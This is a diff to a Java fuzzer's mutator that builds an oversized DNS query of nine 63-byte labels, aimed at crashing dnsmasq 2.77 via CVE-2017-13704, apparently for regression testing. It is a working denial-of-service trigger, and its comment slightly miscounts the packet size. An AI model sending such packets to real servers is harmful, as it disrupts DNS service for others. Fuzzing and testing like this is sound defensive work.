@@ -142,26 +142,30 @@ public class Mutators {
         public byte[] mutate(byte[] input) {
             if (input.length < 12) return Arrays.copyOf(input, input.length);
 
-            // Build oversize name: [63]AAAAAA...[63]BBBBBB...[63]CCCCCC...[3]DDD[0]
-            byte[] longLabel = new byte[255];
-            longLabel[0] = 63;
-            Arrays.fill(longLabel, 1, 64, (byte)'A');
-            longLabel[64] = 63;
-            Arrays.fill(longLabel, 65, 128, (byte)'B');
-            longLabel[128] = 63;
-            Arrays.fill(longLabel, 129, 192, (byte)'C');
-            longLabel[192] = 62;
-            Arrays.fill(longLabel, 193, 255, (byte)'D');
-            // No root label (intentionally — tests missing terminator)
+            // CVE-2017-13704: dnsmasq 2.77 crashes on DNS queries exceeding 512 bytes.
+            // A regression introduced as a security improvement caused a crash when
+            // processing queries over the UDP packet size limit.
+            //
+            // We build a QNAME using maximum-length labels (63 bytes each, RFC 1035 max)
+            // repeated enough times to push the total packet well over 512 bytes.
+            // 9 labels × 64 bytes (1 length + 63 data) = 576 bytes of QNAME alone,
+            // producing a 592-byte packet total — reliably above the 512-byte threshold.
+            java.io.ByteArrayOutputStream qname = new java.io.ByteArrayOutputStream();
+            for (int i = 0; i < 9; i++) {
+                qname.write(63); // label length
+                for (int j = 0; j < 63; j++) {
+                    qname.write('a' + (i % 26));
+                }
+            }
+            qname.write(0); // root label terminator
 
-            // Suffix: QTYPE + QCLASS
-            byte[] suffix = {0x00, 0x01, 0x00, 0x01}; // TYPE=A, CLASS=IN
-
+            byte[] suffix = {0x00, 0x01, 0x00, 0x01}; // QTYPE=A, QCLASS=IN
             byte[] header = Arrays.copyOf(input, 12);
-            byte[] out = new byte[12 + longLabel.length + suffix.length];
+            byte[] qnameBytes = qname.toByteArray();
+            byte[] out = new byte[12 + qnameBytes.length + suffix.length];
             System.arraycopy(header, 0, out, 0, 12);
-            System.arraycopy(longLabel, 0, out, 12, longLabel.length);
-            System.arraycopy(suffix, 0, out, 12 + longLabel.length, suffix.length);
+            System.arraycopy(qnameBytes, 0, out, 12, qnameBytes.length);
+            System.arraycopy(suffix, 0, out, 12 + qnameBytes.length, suffix.length);
             return out;
         }
 
